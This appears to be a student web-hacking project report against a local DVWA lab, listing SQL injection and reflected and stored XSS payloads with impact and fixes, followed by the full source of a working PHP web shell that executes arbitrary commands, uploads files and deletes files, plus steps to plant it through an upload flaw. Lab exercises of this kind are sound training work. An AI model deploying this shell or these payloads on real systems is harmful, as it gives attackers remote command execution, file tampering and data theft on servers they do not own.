Web Hack Project 

Objective

To validate the project, you need to:

    1. Find at least 3 vulnerabilities.
    2. Develop a c99 or r57 type PHP shell that allows file upload, file deletion, and command execution.

Vulnerabilities

1. SQL Injection

    Description: SQL Injection is a code injection technique that exploits a vulnerability in an application's software by injecting SQL queries via input data from the client to the application.

    Steps to Exploit:

        1. Navigate to the SQL Injection section.
        2. Enter 1' UNION SELECT NULL, @@version-- - in the User ID field.
        3. Submit the form.
        4. The database version is displayed.

    Impact: Attackers can access and manipulate the database, leading to data leakage, loss of data integrity, or even gaining control over the database server.

    How to Fix:
    Use prepared statements and parameterized queries.
    Validate and sanitize all user inputs.
    Implement proper error handling to avoid exposing database errors to users.

2. XSS (Reflected)

    Description: Reflected XSS occurs when an attacker injects malicious scripts into a web request that is reflected off a web server and executed by the victim’s browser.

    Steps to Exploit:

        1. Navigate to the "What's your name?" input field.
        2. Enter <svg/onload=alert(1)>.
        3. Submit the form.
        4. Observe the alert box showing 1.

    Impact: Attackers can inject scripts to steal cookies, session tokens, or other sensitive information, deface the website, or perform phishing attacks.

    How to Fix:
    Encode output to ensure that any user input is rendered harmless.
    Use Content Security Policy (CSP) to mitigate XSS attacks.
    Validate and sanitize user inputs.

3. XSS (Stored)

    Description: Stored XSS occurs when user input is stored on the server (e.g., in a database) and then displayed to other users without proper sanitization.

    Steps to Exploit:

        1. Navigate to the XSS (Stored) page in DVWA.
        2. In the "Name" field, write whatever you want.
        3. In the "Message" field, enter <svg/onload=alert(1)>.
        4. Click "Sign Guestbook".
        5. Observe the alert box showing 1.

    Impact: Attackers can inject scripts that execute when other users visit the page, potentially stealing data, defacing the website, or performing other malicious actions.

    How to Fix:

    Encode output to ensure that any stored user input is rendered harmless.
    Use Content Security Policy (CSP) to mitigate XSS attacks.
    Validate and sanitize user inputs before storing them.

4. Develop a PHP Shell (c99/r57 Type)
    PHP Shell Code:

        <?php
        if(isset($_REQUEST['cmd'])){
            echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
        }
        if(isset($_FILES['file'])){
            move_uploaded_file($_FILES['file']['tmp_name'], "./".$_FILES['file']['name']);
            echo "File uploaded successfully.";
        }
        if(isset($_REQUEST['delete'])){
            unlink($_REQUEST['delete']);
            echo "File deleted successfully.";
        }
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Simple PHP Shell</title>
        </head>
        <body>
            <h1>PHP Shell</h1>
            <form method="GET">
                <input type="text" name="cmd" placeholder="Command">
                <button type="submit">Execute</button>
            </form>
            <br>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file">
                <button type="submit">Upload File</button>
            </form>
            <br>
            <form method="GET">
                <input type="text" name="delete" placeholder="Filename to delete">
                <button type="submit">Delete File</button>
            </form>
        </body>
        </html>

    Steps to Deploy and Test the PHP Shell:

        1. Create a PHP shell named my_shell.php with the code provided above.
        2. Upload the PHP shell using the file upload vulnerability.
        3. Once uploaded, navigate to http://127.0.0.1/hackable/uploads/my_shell.php.
        4. Test the shell by executing a command like "ls".
        5. Upload a file and verify its presence by executing the "ls" command.
        6. Delete the uploaded file using the shell and verify its deletion with "ls".

Made by Ragnar Küüsmaa